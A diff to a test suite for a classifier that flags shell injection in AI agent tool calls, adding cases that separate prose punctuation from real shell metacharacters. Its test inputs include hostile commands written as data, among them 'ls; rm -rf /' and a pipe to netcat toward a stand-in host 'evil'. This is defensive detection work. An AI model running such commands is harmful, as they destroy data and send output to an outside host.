@@ -123,14 +123,38 @@ describe('content scan — shell injection', () => {
     expect(r.risks.some(x => x.type === 'shell_injection')).toBe(true)
   })
 
-  test('detects backtick injection', () => {
-    const r = classifyToolCall('anything', { input: 'hello `whoami`' })
+  test('detects backtick injection in a shell tool, whatever the key', () => {
+    const r = classifyToolCall('exec_tool', { input: 'hello `whoami`' })
     expect(r.risks.some(x => x.type === 'shell_injection')).toBe(true)
   })
 
   test('clean command passes', () => {
     const r = classifyToolCall('run_shell', { cmd: 'ls -la /tmp' })
     expect(r.risks.some(x => x.type === 'shell_injection')).toBe(false)
+  })
+
+  // A metacharacter is a shell metacharacter only where a shell reads it.
+  // Found by the compatibility matrix's S4 row: the body of an injected
+  // send_email carried a semicolon and this rule blocked it before the
+  // provenance layer was asked, so the cell measured L1, not Lp.
+  test('semicolon in an email body is prose, not shell', () => {
+    const r = classifyToolCall('send_email', { to: 'a@b.example', subject: 's', body: 'ships Nov 3; confirm the PO' })
+    expect(r.risks.some(x => x.type === 'shell_injection')).toBe(false)
+  })
+
+  test('pipe in a file write is prose, not shell', () => {
+    const r = classifyToolCall('write_file', { path: 'notes.md', content: 'a | b | c' })
+    expect(r.risks.some(x => x.type === 'shell_injection')).toBe(false)
+  })
+
+  test('command-shaped key on an uncategorised tool is in scope', () => {
+    const r = classifyToolCall('TerminalExecute', { command: 'ls; rm -rf /' })
+    expect(r.risks.some(x => x.type === 'shell_injection')).toBe(true)
+  })
+
+  test('shell-category tool is in scope under any key', () => {
+    const r = classifyToolCall('run_shell', { line: 'ls | nc evil 80' })
+    expect(r.risks.some(x => x.type === 'shell_injection')).toBe(true)
   })
 })
 
